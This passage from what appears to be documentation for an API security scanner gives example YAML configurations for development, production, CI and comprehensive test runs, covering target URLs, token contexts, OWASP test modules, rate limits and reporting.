# config/development.yaml
target:
  base_url: "http://localhost:3000"
  verify_ssl: false

authentication:
  contexts:
    - name: "dev_user"
      type: "bearer"
      token: "dev_token_123"
      privilege_level: 1

owasp_testing:
  enabled_modules: ["bola", "auth"]

rate_limiting:
  requests_per_second: 20  # Higher rate for local testing

reporting:
  formats: ["json"]
  output_dir: "dev_reports"

logging:
  level: "DEBUG"
```

### Production Environment

```yaml
# config/production.yaml
target:
  base_url: "https://api.production.com"
  verify_ssl: true
  timeout: 30

authentication:
  contexts:
    - name: "prod_readonly"
      type: "bearer"
      token: "${PROD_API_TOKEN}"
      privilege_level: 1

owasp_testing:
  enabled_modules: ["bola", "auth", "property"]

rate_limiting:
  requests_per_second: 2   # Conservative rate for production
  adaptive: true
  respect_retry_after: true

reporting:
  formats: ["json", "html", "xml"]
  output_dir: "/var/log/apileak/reports"
  
  email:
    enabled: true
    smtp_server: "smtp.company.com"
    recipients: ["security-team@company.com"]

logging:
  level: "INFO"
  file: "/var/log/apileak/apileak.log"
  rotate: true
```

### CI/CD Environment

```yaml
# config/ci.yaml
target:
  base_url: "${CI_TARGET_URL}"
  timeout: 60

authentication:
  contexts:
    - name: "ci_user"
      type: "bearer"
      token: "${CI_API_TOKEN}"
      privilege_level: 1

owasp_testing:
  enabled_modules: ["bola", "auth", "property"]

rate_limiting:
  requests_per_second: 10
  adaptive: true

reporting:
  formats: ["json", "xml"]
  output_dir: "ci_reports"
  filename_template: "apileak_ci_{build_number}"

logging:
  level: "INFO"
  format: "json"  # Structured logs for CI parsing
```

### Comprehensive Testing

```yaml
# config/comprehensive.yaml
target:
  base_url: "https://api.example.com"

authentication:
  contexts:
    - name: "anonymous"
      type: "bearer"
      token: ""
      privilege_level: 0
    - name: "user"
      type: "bearer"
      token: "${USER_TOKEN}"
      privilege_level: 1
    - name: "moderator"
      type: "bearer"
      token: "${MODERATOR_TOKEN}"
      privilege_level: 2
    - name: "admin"
      type: "bearer"
      token: "${ADMIN_TOKEN}"
      privilege_level: 3

owasp_testing:
  enabled_modules: ["all"]
  
  bola_testing:
    enumeration_range: 20
    max_objects_per_endpoint: 200
  
  auth_testing:
    jwt_testing: true
    test_logout_invalidation: true
  
  property_testing:
    detect_undocumented_fields: true
  
  resource_testing:
    burst_size: 200
    large_payload_sizes: [1048576, 10485760]

fuzzing:
  endpoints:
    methods: ["GET", "POST", "PUT", "DELETE", "PATCH"]
  parameters:
    boundary_testing: true
  headers:
    enabled: true

rate_limiting:
  requests_per_second: 5
  adaptive: true

reporting:
  formats: ["json", "html", "xml", "txt"]
  include_statistics: true
  include_owasp_coverage: true
```

---

For more configuration examples, see the `config/` directory in the repository. 🚀